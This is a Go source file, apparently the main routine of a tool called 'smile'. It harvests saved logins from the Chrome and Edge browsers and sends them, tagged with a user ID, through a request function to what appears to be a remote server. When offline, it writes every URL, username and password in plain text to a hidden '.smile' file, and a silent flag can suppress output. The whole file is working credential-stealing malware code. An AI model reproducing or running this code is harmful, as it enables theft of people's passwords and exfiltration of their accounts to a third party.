package main

import (
	"fmt"
	"os"
	"regexp"
	"smile/browsers"
	"smile/config"
	"smile/requests"
)

func main() {
	config.SetConfig();

	Data := []browsers.BrowserConfig{}

	// Retrieve credentials from browsers
	Data = append(Data, browsers.Chrome())
	// Data = append(Data, browsers.Firefox());
	Data = append(Data, browsers.Edge())
	// Data = append(Data, browsers.Opera());
	// Data = append(Data, browsers.Safari());

	data := map[string]interface{}{
		"userId": config.USER_ID,
		"data": Data,
	}

	response, err := requests.SendUserData(data)
	if err != nil {
		re := regexp.MustCompile("(?i)no connection could be made")
		if re.MatchString(err.Error()) {
			fmt.Println("No internet connection...")
			dataFile, err := os.Create(".smile")
			if err != nil {
				fmt.Println(err.Error())
			}
			defer dataFile.Close()

			for _, data := range Data {
				for _, credential := range data.Credentials {
					dataFile.WriteString("url: " + credential.URL + "\n")
					dataFile.WriteString("username: " + credential.Username + "\n")
					dataFile.WriteString("password: " + credential.Password + "\n\n")
				}
			}

			fmt.Println("Done!")
		} else {
			fmt.Println(err.Error())
		}
	}

	if !config.SILENT {
		fmt.Println(response)
	}
}